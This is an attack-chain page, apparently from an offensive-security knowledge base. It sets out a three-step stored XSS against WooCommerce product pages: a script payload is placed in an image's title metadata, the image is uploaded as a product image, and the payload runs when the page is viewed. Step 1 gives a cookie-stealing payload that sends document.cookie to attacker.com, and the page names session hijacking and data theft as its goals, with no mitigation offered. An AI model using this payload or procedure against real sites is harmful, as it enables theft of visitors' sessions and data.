---
tags:
  - xss
  - stored-xss
  - woocommerce
  - wordpress
  - image-upload
  - metadata-injection
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - PHP
  - WordPress
submitted: true
complexity: medium
created_at: '2024-01-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-XSS-into-Image-Metadata]]'
  - '[[procedures/Upload-Malicious-Image-to-WooCommerce]]'
  - '[[procedures/Trigger-XSS-on-Product-Page]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:52:33.436Z'
description: >-
  A multi-stage attack exploiting insufficient sanitization of image metadata in
  WooCommerce, allowing stored XSS execution on product pages.
skill_level: intermediate
impact_level: high
id: d75b3962-373f-443e-be78-1465701a575a
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exploit Public-Facing Application]]'
---
# Stored XSS via Image Title Metadata in WooCommerce

Multi-stage attack chain demonstrating a complete attack workflow exploiting a stored XSS vulnerability in WooCommerce's image handling.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Malicious Image] --> B[Upload to Product]
    B --> C[View Product Page]
    C --> D[XSS Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Image editing software (e.g., Windows File Explorer for metadata)

### Target Environment

- WordPress with WooCommerce plugin installed
- Admin access to WooCommerce backend for product creation
- Web browser for viewing product pages

### Initial Access Requirements

- Authenticated access to WordPress admin panel
- No special network position required; attack leverages standard upload functionality
- Prior access to create or modify image files

## Detailed Attack Procedures

### Step 1: Prepare Malicious Image
procedure: [[procedures/Inject-XSS-into-Image-Metadata]]

**Objective**: Inject a malicious JavaScript payload into the image file's title metadata to prepare for XSS execution.

**Instructions**: Use Windows file properties to embed the XSS payload in the image title. For example, set the title to `<script>alert(1)</script>` or a more advanced payload like `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`.

**Expected Output**: An image file (e.g., test.jpg) with the malicious title metadata embedded, verifiable via file properties.

**Success Indicators**:
- Image metadata shows the injected XSS payload
- File remains a valid image format (e.g., JPEG)

### Step 2: Upload Malicious Image
procedure: [[procedures/Upload-Malicious-Image-to-WooCommerce]]

**Objective**: Upload the prepared image as a product image in WooCommerce, storing the malicious metadata on the server.

**Instructions**: Log in to the WordPress admin, navigate to Products > Add New, and in the product editor, set the featured image or gallery image to the malicious file. Save the product.

**Expected Output**: Product created successfully with the image attached, metadata preserved on the server.

**Success Indicators**:
- Image uploads without errors
- Product page preview shows the image

### Step 3: Trigger XSS Execution
procedure: [[procedures/Trigger-XSS-on-Product-Page]]

**Objective**: View the product page to trigger the unsanitized output of the image title, executing the XSS payload in the victim's browser.

**Instructions**: Publish the product and access its frontend page (e.g., via the product permalink). The title metadata is reflected without sanitization, executing the script.

**Expected Output**: JavaScript alert or redirection occurs, potentially stealing session cookies or defacing the page.

**Success Indicators**:
- Script executes (e.g., alert pops up)
- Network requests to attacker server if payload includes exfiltration

## Attack Chain Summary

### Key Achievements

1. Successful injection of XSS via image metadata
2. Storage and persistence of payload through WooCommerce upload
3. Arbitrary JavaScript execution on product page views, enabling session hijacking or data theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Initial Access]]

---
*Last updated: 2024-01-01T00:00:00Z*
